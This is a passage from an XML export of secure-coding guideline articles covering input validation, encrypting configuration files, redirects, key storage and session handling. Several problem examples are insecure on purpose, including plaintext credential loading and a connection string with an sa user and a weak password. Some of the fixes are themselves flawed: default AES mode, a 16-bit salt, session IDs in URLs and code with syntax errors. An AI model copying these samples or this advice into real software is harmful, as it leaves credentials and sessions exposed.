that in large applications.&nbsp; A crossover point is anywhere where user input is included textually in some larger body of command text, or where a security-relevant decision is made based on it.&nbsp; A good example of a crossover point is a dynamic SQL query.&nbsp; The risk here is of the user input crossing over into the associated command data, allowing an attacker to execute commands.&nbsp; Xpath and other XML injections are another example here.&nbsp; The worst case here is when user input is evaluated by a languages built-in "eval" command or something similar -- these commands should never be used, even with values that look safe, because of the risks associated.</p><p>Once the crossover points are found, all inputs should be traced back to make sure that they've been validated appropriately beforehand, and a comment again stating the format, source, and validation point should be made.&nbsp;&nbsp;All crossover points have, depending on the technology involved, different sets of safe characters.&nbsp; Using the whitelist approach described below, the safe set of characters for that crossover point should be compared against what the validator will allow through; the allowed characters must be a subset of the safe ones.</p><p>Whenever possible, steps should be taken to remove crossover points entirely.&nbsp; Switching from dynamic SQL to stored procedures with bound parameters removes an entire category of crossover points from the system, and greatly reduces risk to an entire class of attacks.&nbsp; Similar things can be done with other types of crossovers.</p><h2>4. Determine all outputs</h2><p>The last point of concern is the list of outputs from the system.&nbsp; This will likely have a certain amount of overlap with the list of crossover points, which is fine.&nbsp; Again, we need to determine the allowable format for each output, and look at where the incoming data is being validated.&nbsp; If there's any question of whether the data may contain dangerous characters, it should be encoded in a manner appropriate to the specific output.&nbsp; There are more output contexts than one might thing; the contents of HTML attributes, the tags themselves, free text between the tags, and javascript strings all have different safe sets of characters (and a different encoding, in the last case).&nbsp; Comments on the input source, format, validation point, and encoding point&nbsp;are also useful here.</p><h2>5. Build a centralized validation module</h2><p>One of the biggest dangers of implementing input validation is inconsistent validation; an attack may be caught on one data path, but not on another.&nbsp; An attacker will try all of them, however.&nbsp; The way to solve this problem is to have a single point of responsibility for input validation.&nbsp; Where this is depends on the design.&nbsp; If every piece of input is an object, then it may be appropriate to have the object constructs and setters perform the validation for that object's input.&nbsp; In a less strictly OO system, a single module with methods for each different input format may be more appropriate.</p><p>Which ever method is chosen, the input validation routine for a specific data type should be as strict as possible.&nbsp; For example, when validating a US zip code, allow either 5 or 9 numbers, and nothing else.&nbsp; If you're dealing with international postal codes, either validate them seperately with a looser format that also allows letters, or build a more complex validator that understands the postal codes of each nation, if you need to ensure a higher level of integrity.</p><h2>6. Build a centralized encoding module</h2><p>In an ideal world, all encoding routines would be done via the same libraries which are used to create output.&nbsp; While many HTML control libraries attempt this, none of them take the whitelist approach.&nbsp; Instead, they try to guess which characters might be harmful, a list which is categorically incomplete.&nbsp; Unless you want to build a new output library (which might be an option on a large enough application), you should build a set of data encoders for each ouput context which you have.&nbsp; These encoders should be used as close as possible to the actual point of output; this minimizes the chance of an alternate data path skipping the encoding, and ensures that the developer knows exactly what context the output is being used in.&nbsp; Avoid the temptation to store encoded data, because even if it is initially only used in the context you encoded it for, this may change over time.</p><h2>7. Ensure that all paths through the system preserve validation</h2><p>Once the validation system is complete, all the paths that data takes through the system should be checked to ensure that they preserve the validation properties that are expected.&nbsp; Input which is sent round-trip through a client or another system must be re-validated, unless a cryptographic signature is used to ensure that it has not been tampered with.&nbsp; Validation which occurs on an untrusted system must also be repeated.&nbsp; Client-side validation in javascript is a nice UI touch, but it is trivially circumvented as&nbsp; a security measure.</p><h1>Problem Example</h1><p>A suite of web applications on an e-commerce site share a common back-end database.&nbsp; The largest application is&nbsp;the&nbsp;order entry system and shopping cart.&nbsp; This was the first application built, and was designed with the assumption that the database was trusted.&nbsp; Later, a lightweight app to allow users to quickly check stock levels was built.&nbsp; Because it was a small "read-only" use of the database, input validation was not built into the application.&nbsp; The application contained a SQL injection, allowing an attacker to alter the database in such a way that they could&nbsp;inject javascript into pages which displayed the shopping cart application, allowing them to steal user's passwords.&nbsp;</p><h1>Solution Example</h1><p>A suite of web applications on an e-commerce site share a common back-end database.&nbsp; The largest application is&nbsp;the&nbsp;order entry system and shopping cart.&nbsp; This was the first application built, and was designed with the assumption that the database was trusted.&nbsp; Later, a lightweight app to allow users to quickly check stock levels was built.&nbsp;&nbsp;When the new application was added, the developers realized that the database could no longer be treated as a trusted data store, and added code to the main application to perform data validation on input from the database.&nbsp;&nbsp;&nbsp;Because the new application was a small "read-only" use of the database, the input validation routines written were not properly checked.&nbsp; When an attacker found a SQL injection via the new application and altered the back-end database, they were unable to make that attack chain through to the main application.&nbsp; Furthermore, the logging performed by the main application's data validation routines altered the operations group to the problem, allowing them to fix the smaller application.</p><h1>Additional Resources</h1><ul><li>For more information see, "Chapter 4 - Design Guidelines for Secure Web Applications" at <a href="http://msdn2.microsoft.com/en-us/library/aa302420.aspx">http://msdn2.microsoft.com/en-us/library/aa302420.aspx</a></li></ul><hr><p>Adapted from Microsoft patterns &amp; practices guidance.</p>]]></Data>
    </Content>
  </TeamMentor_Article>
  <TeamMentor_Article Metadata_Hash="340336973" Content_Hash="1768259399">
    <Metadata>
      <Id>91872294-7491-4d61-9111-64180e220a3e</Id>
      <Library_Id>4738d445-bc9b-456c-8b35-a35057596c16</Library_Id>
      <Title>Protect Sensitive Data Inside Configuration Files</Title>
      <Category>Deployment Considerations</Category>
      <Phase>Implementation</Phase>
      <Technology>Java</Technology>
      <Type>Guideline</Type>
      <DirectLink />
      <Tag />
      <Security_Demand />
      <Author />
      <Priority>2</Priority>
      <Status />
    </Metadata>
    <Content Sanitized="true" DataType="Html">
      <Data><![CDATA[<h1>Applies to</h1><ul><li>Applications written using Servlets or JSP.</li></ul><h1>What to Do</h1><p>Protect all sensitive data that is stored within configuration files.</p><h1>Why</h1><p>Configuration files are a likely target for any attacker. If an attacker does compromise the configuration files, any unprotected sensitive data inside them will also be compromised.</p><h1>When</h1><p>If your application uses configuration files that contain sensitive data such as connection strings, directory paths or credentials, then protect the files.</p><h1>How</h1><p>To protect sensitive data inside configuration files use the following steps:</p><ol><li><p><strong>Identify the sensitive data. </strong>Locate all sensitive data that is stored inside configuration files. Examples of sensitive data include, but are not limited to, credentials, connection strings and directory paths.</p></li><li><p><strong>Encrypt sensitive data inside the configuration files. </strong>Encrypt the sensitive data inside the configuration file to ensure its confidentiality in case this file is compromised. Once the application accesses the configuration file, it should decrypt the sensitive data just before use. Example:</p><blockquote><pre>public Properties loadDatabaseCredentials()<br>      throws GeneralSecurityException, IOException{<br>      // Set the decryption mechanism<br>      byte[] rawKey = getEncryptionKey();<br>      SecretKeySpec skeySpec = new SecretKeySpec(rawKey, "AES");<br>      Cipher cipher = Cipher.getInstance("AES");<br>      cipher.init(Cipher.DECRYPT_MODE, skeySpec);<br> <br>      // Decrypt config file<br> <br>      File configFile = new File("../../config/testProp.config");<br>      byte[] tempBuff = new byte[(int)configFile.length()];<br>      FileInputStream fileStream = new FileInputStream(configFile);<br>      fileStream.read(tempBuff, 0, tempBuff.length);<br> <br>      InputStream propStream = new ByteArrayInputStream(cipher.doFinal(tempBuff));<br>      prop.load(propStream);<br>      propStream.close();<br>      fileStream.close();<br> <br>      return prop;}</pre></blockquote></li><li><p><strong>Protect configuration files.</strong></p><ul><li><p><strong>Choose a configuration directory</strong>: Dedicate a directory for storing your application's configuration files. Make sure the directory is not web-accessible. This limits the scope of users&nbsp;who can potentially compromise the contents inside the directory.</p></li><li><p><strong>Set appropriate permissions</strong>: Apply the appropriate filesystem permissions such that the configuration files can be only accessed by your application and its administrators.</p></li></ul></li></ol><h1>Problem Example</h1><p>The following code retrieves database credentials from a configuration file. Unfortunately, the credentials are not encrypted; therefore, anybody with access to the configuration file can retrieve the credentials and access the database on behalf of the application.</p><blockquote><pre>public Properties loadDatabaseCredentials() throws IOException{<br>      Properties prop = new Properties();<br>      InputStream propStream = new FileInputStream("../../config/testProp.config");<br>      prop.load(propStream);<br>      propStream.close();<br> <br>      return prop;}</pre></blockquote><h1>Solution Example</h1><p>The following code retrieves database credentials from a configuration file. Because the credentials are encrypted, the application decrypts them in real time, protecting the credentials' confidentiality in case the local access to the configuration file is not properly secured.</p><blockquote><pre>public Properties loadDatabaseCredentials()<br>      throws GeneralSecurityException, IOException{<br>      // Set the decryption mechanism<br>      byte[] rawKey = getEncryptionKey();<br>      SecretKeySpec skeySpec = new SecretKeySpec(rawKey, "AES");<br>      Cipher cipher = Cipher.getInstance("AES");<br>      cipher.init(Cipher.DECRYPT_MODE, skeySpec);<br> <br>      // Decrypt config file<br> <br>      File configFile = new File("../../config/testProp.config");<br>      byte[] tempBuff = new byte[(int)configFile.length()];<br>      FileInputStream fileStream = new FileInputStream(configFile);<br>      fileStream.read(tempBuff, 0, tempBuff.length);<br> <br>      InputStream propStream = new ByteArrayInputStream(cipher.doFinal(tempBuff));<br>      prop.load(propStream);<br>      propStream.close();<br>      fileStream.close();<br> <br>      return prop;}</pre></blockquote><h1>Additional Resources</h1><ul><li>To learn more about the JCE API, see: <a href="http://download.oracle.com/javase/1.4.2/docs/guide/security/jce/JCERefGuide.html">Java Cryptography Extension for the Java 2 SDK, v 1.4</a>.</li></ul><h1>Related Items</h1><ul><li><a href="ruledisplay:235E588E-621B-4C5E-A50E-8EA447330AD0">Guideline: Use a Secure Key Storage Location (Java Web Application)</a> </li><li><a href="ruledisplay:EA0D0F4E-A363-4777-9F0D-91E8C5042F9C">Guideline: Do Not Store Plaintext Sensitive Data (Java Web Application)</a> </li><li><a href="ruledisplay:BEC58471-A0EF-40C5-8C9D-9BF5C4B91F1F">Guideline: Filter All User-Supplied Filename and Path Input (Java Web Application)</a> </li><li><a href="ruledisplay:EAD019CA-025A-4DC6-A4DC-6DFDC9FBA131">Guideline: Disable Directory Browsing (Java Web Application)</a> </li><li><a href="ruledisplay:809D9208-0247-40FB-B559-A0EA2069E0E0">Guideline: Protect the JAAS Policy and Configuration Files (Java Web Application)</a> </li><li><a href="ruledisplay:4572037A-2166-4AD1-8E73-D623E468A7B9">Attack: Information Disclosure Attack</a> </li><li><a href="ruledisplay:8DC2828C-AD66-46AE-B1D0-1C4C942C86AA">Checklist Item: Sensitive Data Inside Configuration Files is Protected (Java Web Application)</a> </li></ul>]]></Data>
    </Content>
  </TeamMentor_Article>
  <TeamMentor_Article Metadata_Hash="-261766066" Content_Hash="162045547">
    <Metadata>
      <Id>92f8ce2b-9290-4b24-ab01-24bc0766fd26</Id>
      <Library_Id>4738d445-bc9b-456c-8b35-a35057596c16</Library_Id>
      <Title>Calculate Destinations of Redirects and Forwards Without User Input</Title>
      <Category>Input and Data Validation</Category>
      <Phase>Design</Phase>
      <Technology> Any</Technology>
      <Type>Guideline</Type>
      <DirectLink />
      <Tag />
      <Security_Demand />
      <Author />
      <Priority />
      <Status />
    </Metadata>
    <Content Sanitized="true" DataType="Html">
      <Data><![CDATA[<h1>Applies to</h1><ul><li>Web Applications</li></ul><h1>What to Do</h1><p>Calculate destinations of redirects and forwards without user input.</p><h1>Why</h1><p>Using input to calculate destinations of redirects or forwards may allow an attacker to create hyperlinks that appears to point to legitimate sites but redirect to malicious pages controlled by the attacker. This technique is often used by phishers to trick people into visiting fake sites that steal authentication credentials.</p><h1>When</h1><p>Use this guideline when writing a web application that uses redirects or forwards. Avoid using redirects or forwards in web applications, if possible.</p><h1>How</h1><p>Perform the following actions to calculate destinations of redirects and forwards without user input:</p><ol><li><p><strong>Find redirects and forwards.</strong> Find all pages that perform redirects or forwards. Redirects are also known as "transfers" in .NET.</p></li><li><p><strong>Identify dangerous redirects and forwards.</strong> Find all redirects and forwards that rely on user input to calculate their destinations.</p></li><li><p><strong>Rewrite redirects and forwards.</strong> Consider making design or code changes to get rid of each redirect or forward, if possible. If a redirect or forward is absolutely necessary, consider how it may be rewritten to operate without user input - this is usually possible based on assumptions made in the application design.</p></li></ol><h1>Additional Resources</h1><ul><li>For more information about unvalidated redirects and forwards, please see <a href="http://www.owasp.org/index.php/Top_10_2010-A10-Unvalidated_Redirects_and_Forwards">http://www.owasp.org/index.php/Top_10_2010-A10-Unvalidated_Redirects_and_Forwards</a> </li></ul><h1>Related Items</h1><ul><li><a href="ruledisplay:c2f99851-794e-4cda-a1ee-71447d93bfc8">Don't Use Redirects or Forwards if Possible</a></li><li><a href="ruledisplay:feea0d0c-ff5b-4c30-8f24-483fef3acb33">Validate Destinations of Redirects&nbsp;and Forwards</a></li><li><a href="ruledisplay:9680fe6b-230c-4794-9777-cae02aa597d7">URL Redirection Attack</a></li><li><a href="ruledisplay:1b4602a7-88c5-4255-8f39-4fae73546608">How to Test for URL Redirection Bugs</a></li><li><a href="ruledisplay:15e88928-1cbc-4fdd-8640-90319c81c178">Phishing Attack<br></a></li></ul>]]></Data>
    </Content>
  </TeamMentor_Article>
  <TeamMentor_Article Metadata_Hash="-192292961" Content_Hash="2079829301">
    <Metadata>
      <Id>9bbdcb27-082d-4d84-ab2f-82da682b8013</Id>
      <Library_Id>4738d445-bc9b-456c-8b35-a35057596c16</Library_Id>
      <Title>Store Keys  in User-level Key Store for Shared Hosting Environments</Title>
      <Category>Deployment Considerations</Category>
      <Phase>Deployment</Phase>
      <Technology>ASP.NET 3.5</Technology>
      <Type>Guideline</Type>
      <DirectLink />
      <Tag />
      <Security_Demand />
      <Author />
      <Priority>2</Priority>
      <Status />
    </Metadata>
    <Content Sanitized="true" DataType="Html">
      <Data><![CDATA[<h1>What to Do</h1><p>Use user-level key storage if you run your application in a shared hosting environment.</p><h1>Why</h1><p>To ensure that your application's sensitive data is not accessible to other applications on the server. </p><h1>When</h1><p>Use user-level key storage if you run your application in a shared hosting environment. In this scenario, each application should have a separate identity so they all have their own individual and private key stores.&nbsp;&nbsp;</p><h1>Additional Resources</h1><ul><li>For more information <a onclick="javascript:Track('ctl00_rs1_mainContentContainer_ctl00|ctl00_rs1_mainContentContainer_ctl06',this);" href="http://msdn2.microsoft.com/en-us/library/53tyfkaw.aspx">Encrypting Configuration Information Using Protected Configuration</a></li></ul><hr><p>Adapted from Microsoft patterns &amp; practices guidance. </p>]]></Data>
    </Content>
  </TeamMentor_Article>
  <TeamMentor_Article Metadata_Hash="1135800852" Content_Hash="-2126177747">
    <Metadata>
      <Id>9c905082-0a13-4641-b8cb-28e0bdc710c2</Id>
      <Library_Id>4738d445-bc9b-456c-8b35-a35057596c16</Library_Id>
      <Title>Use RSA-Protected Configuration Provider in Web Farm Environments</Title>
      <Category>Data Access</Category>
      <Phase>Deployment</Phase>
      <Technology>ASP.NET 3.5</Technology>
      <Type>Guideline</Type>
      <DirectLink />
      <Tag />
      <Security_Demand />
      <Author />
      <Priority>2</Priority>
      <Status />
    </Metadata>
    <Content Sanitized="true" DataType="Html">
      <Data><![CDATA[<h1>What to Do</h1><p>Use the RSA Protected Configuration provider to encrypt sections of your configuration files. You can use Aspnet_regiis.exe tool to encrypt sensitive data, such as connection strings, held in the Web.config and Machine.config files.&nbsp;&nbsp;&nbsp;&nbsp;</p><h1>Why</h1><p>Connection strings contain sensitive resource access credentials (e.g., a connection string for a SQL server resource includes a username and password.) Connection strings stored in plaintext are dangerous, because an attacker that can compromise a server will be able to read those connection strings. Even if a machine is not compromised, connection strings stored in plain text&nbsp;are accessible to administrators and any other users with sufficient privileges&nbsp;on the host machine and/or Windows domain.&nbsp;</p><h1>When</h1><p>Always encrypt connection strings. In&nbsp;a web farm environment,&nbsp;the RSA protected configuration provider is an effective way to encrypt and decrypt configuration file sections&nbsp;because it uses asymmetric encryption to encrypt and decrypt,&nbsp;meaning&nbsp;the keys can easily be exported and imported&nbsp;from server to server.&nbsp; If the application is no deployed to a web farm environment DPAPI will work as well as RSA for encrypting connection strings.&nbsp; </p><h1>How</h1><p>Use the following steps to encrypt sections of your configuration files: </p><ol><li><p><strong>Identify the configuration sections to be encrypted.</strong> Encrypting and decrypting data incurs performance overhead. To keep this overhead to a minimum, encrypt only the sections of your configuration file that store sensitive data. In this case, we are interested in encrypting the &lt;connectionStrings&gt; element of the Web.config file since that is where the database connection string will reside. </p></li><li><p><strong>Choose the machine or user store.</strong> The DataProtectionConfigurationProvider supports machine-level and user-level stores for key storage. The choice of store depends largely on whether or not your application shares a server with other applications and whether or not sensitive data must be kept private for each application. </p></li><li><p><strong>Encrypt your configuration file data.</strong> Use the RSA Provider to Encrypt a Connection String in Web.config in a Web Farm. To do this, you must create a custom RSA encryption key container and deploy the same key container on all servers in your Web farm. This won't work by default because the default RSA encryption key, "NetFrameworkConfigurationKey", is different for each computer.</p><p>&nbsp;Run&nbsp;the following command from a .NET command prompt to encrypt the connectionStrings section using the machine level store:</p><pre>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; aspnet_regiis -pe "connectionStrings" -app "/MachineRSA"</pre><p>Note: If your ASP.NET application identity does not have access to the .NET Framework configuration key store, you'll need to grant access.</p></li></ol><h1>Problem Example</h1><p>A web application is running in&nbsp;a web farm environment. The application uses an SQL database instance and has sensitive data that should not be accessible to&nbsp;other applications on the same system.&nbsp;The web.config file contains a connectionString section that&nbsp;the application uses to access the SQL database across all machines in the farm:</p><pre>&lt;connectionStrings&gt;  <br>&lt;add name="MyLocalSQLServer"        <br>  connectionString="Initial Catalog=pubs;User Id=sa;Password=asdasd;       <br>  data source=localhost;Integrated Security=SSPI;"      <br>  providerName="System.Data.SqlClient"/&gt;<br>&lt;/connectionStrings&gt;</pre><p>Unfortunately,&nbsp;anyone capable of reading the web.config file for the application is now able to see the database, the username, and the password for the database instance, and will be able to execute statements at the same level of privilege as the application.</p><h1>Solution Example</h1><p>The web.config file for an application running in a web farm environment contains a connectionString section that&nbsp;the application uses to access the SQL database across all machines in the farm:</p><pre>&lt;connectionStrings&gt;  <br>&lt;add name="MyLocalSQLServer"        <br>  connectionString="Initial Catalog=pubs;User Id=sa;Password=asdasd;       <br>  data source=localhost;Integrated Security=SSPI;"       <br>  providerName="System.Data.SqlClient"/&gt;<br>&lt;/connectionStrings&gt;</pre><p>Use the RSA Protected Configuration Provider&nbsp;with the&nbsp;machine key&nbsp;store to encypt&nbsp;the connectionStrings section. Add and configure a protected configuration provider to use the&nbsp;machine key&nbsp;store and run the following command from to encrypt the connectionStrings:</p><blockquote><pre>aspnet_regiis -pe "connectionStrings" -app "/MachineRSA"</pre></blockquote><p>At this point the connection string has been encrypted, which can be verified by looking at the web.config file. There is no need to decrypt the file by hand, since ASP.NET handles this transparently.&nbsp;&lt;&lt;Prashant - The solution does not talk about how the keys are exported and imported and used on other machines in the farm&gt;&gt;</p><h1>Related Items</h1><ul><li><a href="ruledisplay:f10679b7-5390-49ee-b529-7a2f7c059ce7">Encrypt Connection Strings</a> </li><li><a href="ruledisplay:1fe40372-6648-4496-8552-794f91ff6bbf">Connection Strings are Secured</a></li></ul><hr><p>Adapted from Microsoft patterns &amp; practices guidance. </p>]]></Data>
    </Content>
  </TeamMentor_Article>
  <TeamMentor_Article Metadata_Hash="-706320806" Content_Hash="-1597884502">
    <Metadata>
      <Id>9fc08a19-1267-4260-b29a-7afbb5f3ba32</Id>
      <Library_Id>4738d445-bc9b-456c-8b35-a35057596c16</Library_Id>
      <Title>Protect Your Session State Communication Channel</Title>
      <Category>Session Management</Category>
      <Phase>Deployment</Phase>
      <Technology>ASP.NET 3.5</Technology>
      <Type>Guideline</Type>
      <DirectLink />
      <Tag />
      <Security_Demand />
      <Author />
      <Priority>2</Priority>
      <Status />
    </Metadata>
    <Content Sanitized="true" DataType="Html">
      <Data><![CDATA[<h1>What to Do</h1><p>Protect the channel to the remote state store via encryption. </p><h1>Why</h1><p>To ensure the user state remains private and unaltered. </p><h1>When</h1><p>If the state service is located on a remote server and you are concerned about the network eavesdropping threat apply this rule. </p><h1>How</h1><p>To protect sensitive session state over the network between the Web server and remote state store, protect the channel to the two servers using IPSec or SSL. This provides privacy and integrity for the session state data across the network. If you use SSL, you must install a server certificate on the database server. </p><h1>Related Items</h1><ul><li><a href="ruledisplay:f10679b7-5390-49ee-b529-7a2f7c059ce7">Encrypt Connection Strings</a></li><li><a href="ruledisplay:39be86fd-65da-4b79-8636-71cbc16e445c">The Session State Port is Changed from the Default of 42424</a></li></ul><hr><p>Adapted from Microsoft patterns &amp; practices guidance. </p>]]></Data>
    </Content>
  </TeamMentor_Article>
  <TeamMentor_Article Metadata_Hash="983035931" Content_Hash="-754696710">
    <Metadata>
      <Id>a32c4cac-014c-4391-a5c1-6f30b318ad32</Id>
      <Library_Id>4738d445-bc9b-456c-8b35-a35057596c16</Library_Id>
      <Title>Store JSESSIONIDs in the URL When Cookies Are Disabled</Title>
      <Category>Session Management</Category>
      <Phase>Design</Phase>
      <Technology>Java</Technology>
      <Type>Guideline</Type>
      <DirectLink />
      <Tag />
      <Security_Demand />
      <Author />
      <Priority>2</Priority>
      <Status />
    </Metadata>
    <Content Sanitized="true" DataType="Html">
      <Data><![CDATA[<h1>Applies to</h1><ul><li>Applications written using Servlets or JSP.</li></ul><h1>What to Do</h1><p>Store the <strong>JSESSIONIDs</strong> inside the URL when cookies are disabled by the browser.</p><h1>Why</h1><p><strong>JSESSIONIDs</strong> are the identifiers that match a client to a session. The use of truly random <strong>JSESSIONID</strong> makes it difficult for an attacker to hijack the session and impersonate a user.</p><h1>When</h1><p>If your application supports authentication but cannot use cookies.</p><h1>How</h1><p>The only information that the browser needs to know once a session has been created for a user is its ID (i.e. <strong>JSESSIONID</strong>). <strong>JSESSIONIDs</strong> should be stored inside cookies. However, <strong>JSESSIONIDs</strong> can be stored inside the URL if cookies are disabled. To use <strong>JSESSIONIDs</strong> properly:</p><ol><li><p><strong>Check if cookies are accepted. </strong>Verify whether the client has enabled cookies. Store <strong>JSESSIONIDs</strong> in cookies if possible; however, if cookies are not enabled, Java allows session IDs to be passed in the URL.</p></li><li><p><strong>Pass the session ID to the client. </strong>Use one of the following approaches when passing the <strong>JSESSIONID</strong> to the client:</p><ul><li><p><strong>Cookies</strong>: Cookies are the preferred way of passing <strong>JSESSIONID</strong> to the browser. The cookie should store only the session identifier and nothing more. All other data should reside inside the server-side session.</p><blockquote><pre>HttpSession session = request.getSession(true);Subject subject = auth.getSubject();session.setAttribute("AuthUser", subject);</pre></blockquote></li><li><p><strong>URL</strong>: <strong>JSESSIONIDs</strong> can also be stored in URLs. This should be a back-up approach that is executed only when cookies are disabled. Adding the session identifier into a URL is done through <strong>HttpServletResponse.encodeUrl</strong>.</p><blockquote><pre>String url = request.getRequestURL().toString();url = response.encodeURL(url);response.sendRedirect(url);</pre></blockquote><p>However, be exceptionally careful when linking to external sites. Because of the HTTP Referer header, the <strong>JSESSIONID</strong> can leak out when following a link to an external site. This issue can be mitigated by setting up a forward page where <strong>JSESSIONIDs</strong> are stripped from the URL and the user is forwarded to the external site.</p></li></ul></li></ol><h1>Problem Example</h1><p>The following code shows the login interaction between the application and the user. Once the user requests the initial page, the application forwards him to the login screen. Upon verifying the credentials, the application loads the main application interface. Unfortunately, the application does not check whether the client supports cookies which causes&nbsp;a broken access control, and&nbsp;the valid user may not be able to access the application.</p><blockquote><pre>&lt;%-- Filename: /myapp/index.jsp --%&gt;<br>&lt;%-- The application fails to check whether the client supports cookies --%&gt;<br>&lt;jsp:forward page="/myapp/login.jsp" /&gt;<br>  <br>&lt;%-- Filename: /myapp/login.jsp --%&gt;<br>&lt;html&gt;<br>  &lt;head&gt;<br>    &lt;title&gt;::login&lt;/title&gt;<br>  &lt;/head&gt;<br>  &lt;body&gt;<br>    &lt;form method="POST" action="https://login.example.com/myapp/auth"&gt;<br>    &lt;input type="text" name="user" size="20"&gt;<br>    &lt;br&gt;&lt;input type="password" name="pass" size="20"&gt;<br>    &lt;br&gt;&lt;input type="submit" value="log in"&gt;&lt;/form&gt;<br>  &lt;/body&gt;<br>&lt;/html&gt;<br>  /*  Filename: /myapp/auth  */<br>import java.io.*;<br>import java.util.*;<br>import javax.servlet.*;<br>import javax.servlet.http.*;<br> <br>public final class Auth extends HttpServlet{<br>      public void doGet(HttpServletRequest request,<br>              HttpServletResponse response) throws ServletException, IOException<br>      {<br>            HttpSession session = request.getSession(true);<br>            String redirectURL = "/myapp/main";<br> <br>            //The application fails to check whether the client supports cookies<br>            ...<br> <br>            response.sendRedirect(redirectURL);<br>      }<br>}</pre></blockquote><h1>Solution Example</h1><p>The following code shows the login interaction between the application and the user. Once the user requests the initial page, the application forwards him to the login screen. Upon verifying the credentials, the application loads the main application interface. Fortunately, the application checks whether the client supports cookies; therefore, any user with disabled&nbsp;cookies will still be able to use the application. </p><blockquote><pre>&lt;%-- Filename: /myapp/index.jsp --%&gt;<br>&lt;%<br>// The application initiates a test that determines<br> <br>// whether cookies are enabledCookie<br> <br>testCookie = new Cookie(""myappTestCookie", "testVal");<br>testCookie.setMaxAge(300);<br>response.addCookie(testCookie);%&gt;<br>&lt;jsp:forward page="/myapp/login.jsp" /&gt;<br> <br> <br>&lt;%-- Filename: /myapp/login.jsp --%&gt;<br>&lt;html&gt;<br>  &lt;head&gt;<br>    &lt;title&gt;::login&lt;/title&gt;<br>  &lt;/head&gt;<br>  &lt;body&gt;<br>    &lt;form method="POST" action="https://login.example.com/myapp/auth"&gt;<br>    &lt;input type="text" name="user" size="20"&gt;<br>    &lt;br&gt;&lt;input type="password" name="pass" size="20"&gt;<br>    &lt;br&gt;&lt;input type="submit" value="log in"&gt;&lt;/form&gt;<br>  &lt;/body&gt;<br>&lt;/html&gt;<br> <br> <br>/*  Filename: /myapp/auth  */<br>import java.io.*;<br>import java.util.*;<br>import javax.servlet.*;<br>import javax.servlet.http.*;<br> <br>public final class Auth extends HttpServlet{<br>      public void doGet(HttpServletRequest request,<br>              HttpServletResponse response) throws ServletException, IOException<br>      {<br>            HttpSession session = request.getSession(true);<br>            Cookie[] cookies = request.getCookies();<br>            String redirectURL = "/myapp/main";<br>            boolean cookiesSupported = true;<br> <br>            ...<br> <br>            // The application checks if the test cookie is accepted by the client<br>            if (cookies.length &lt; 1)<br>            {<br>                  cookiesSupported = false;<br>            }<br> <br>            ...<br> <br>            if (!cookiesSupported)<br>            {<br>                  redirectURL = response.encodeURL(redirectURL);<br>            }<br> <br>            response.sendRedirect(redirectURL);<br>      }<br>}</pre></blockquote><h1>Additional Resources</h1><ul><li>For more information on HTTP sessions, see: Documentation for <a href="http://download.oracle.com/javaee/1.3/api/javax/servlet/http/HttpSession.html">Interface HttpSession</a> in Java SDK. </li><li>For more information on HTTP cookies, see: Documentation for <a href="http://download.oracle.com/javaee/1.3/api/javax/servlet/http/Cookie.html">Class Cookie</a> in Java SDK. </li><li>For more information on HTTP responses, see: Documentation for <a href="http://download.oracle.com/javaee/1.3/api/javax/servlet/http/HttpServletResponse.html">Interface HttpServletResponse</a> in Java SDK. </li><li>To learn more about session management, see: <a href="http://www.securityfocus.com/infocus/1774">Basic Web Session Impersonation</a>. </li><li>To learn more about session prediction attacks, see: <a href="http://www.webappsec.org/projects/threat/classes/credential_session_prediction.shtml">Credential and Session Prediction</a>.</li></ul><h1>Related Items</h1><ul><li><a href="ruledisplay:33D22944-96D4-4711-AE97-BD87A87463C9">Guideline: Do Not Place Sensitive Data in Parameters (Java Web Application)</a> </li><li><a href="ruledisplay:3EB8979E-59F0-4C2B-8D8A-CFB173E5D66B">Attack: HTTP Session Hijacking Attack</a> </li><li><a href="ruledisplay:74F3AE96-F7AD-45A2-B8DE-008D23234123">Checklist Item: JSESSIONIDs are Stored in the URL When Cookies are Disabled (Java Web Application)</a> </li></ul>]]></Data>
    </Content>
  </TeamMentor_Article>
  <TeamMentor_Article Metadata_Hash="-1556035302" Content_Hash="1960955043">
    <Metadata>
      <Id>a94e0193-b5ab-43e0-b6b1-8e7f0ce69206</Id>
      <Library_Id>4738d445-bc9b-456c-8b35-a35057596c16</Library_Id>
      <Title>Protect Sensitive Data Over the Network</Title>
      <Category>Sensitive Data</Category>
      <Phase>Implementation</Phase>
      <Technology>Java</Technology>
      <Type>Guideline</Type>
      <DirectLink />
      <Tag />
      <Security_Demand />
      <Author />
      <Priority>2</Priority>
      <Status />
    </Metadata>
    <Content Sanitized="true" DataType="Html">
      <Data><![CDATA[<h1>Applies to</h1><ul><li>Applications written using Servlets or JSP.</li></ul><h1>What to Do</h1><p>Use encryption to protect sensitive data that is transmitted over the network. </p><h1>Why</h1><p>Because network traffic&nbsp;is easily eavesdropped on or modified by attackers, passing sensitive data as plaintext&nbsp;over the network&nbsp;can lead&nbsp;to a host of attacks, including data theft and data manipulation.</p><h1>When</h1><p>Apply this guideline when your application transmits sensitive data over unprotected communication channels.</p><h1>How</h1><p>Use the following steps to protect sensitive data over the network:</p><ol><li><p><strong>Identify sensitive information. </strong>Sensitive data is any information that is kept secret and should be disclosed only to authorized parties. Common examples of sensitive data include, but are not limited to, names of customers, government issued ID numbers, credit card and other financial information, passwords and private keys. Some industries, such as health care and banking, have regulatory standards that define sensitive information. Use regulatory requirements, as they apply to your application, to identify sensitive data. Sensitive data can be defined as follows:</p><ul><li>Information that either contains personally identifiable information or can be used to derive personally identifiable information that should not be shared with others. </li><li>Information that a user provides that they would not want shared with other users of the application. </li><li>Information that comes from an external trusted source that is not designed to be shared with users.</li></ul></li><li><p><strong>Choose an appropriate protection mechanism. </strong>Choosing the appropriate protection mechanism may depend on various conditions: purpose of the sensitive data, role of the other network party, infrastructure and supported technologies. Because sensitive data must be encrypted when in transit, there are two strategies, to encrypt the communication channel or to encrypt the application data:</p><ul><li><p><strong>Encrypt the communication channel</strong>: Depending on the current infrastructure and the other network party, it is possible to encrypt the connections using Java's crypto library or any technologies supported by the remote party. For more information, consult the <a href="ruledisplay:5E283FD0-1A55-4DC3-971D-BF7C3318E7CB">Encrypt Communication Links</a> guideline.</p></li><li><p><strong>Encrypt the application data</strong>: If your application's communication channels cannot be encrypted, encrypt the application data. Hashing or encryption should be used when protecting the application data. Use hashing if the application data will be used only for comparison purposes. Use encryption if the application data will be retrieved at a later stage.</p><p>If hashing is used, choose a longer salt, 16 or more bits.&nbsp;In the case&nbsp;that the produced hash is compromised, longer salts make it more difficult for an attacker to gain access to the sensitive data. If your application uses randomly generated 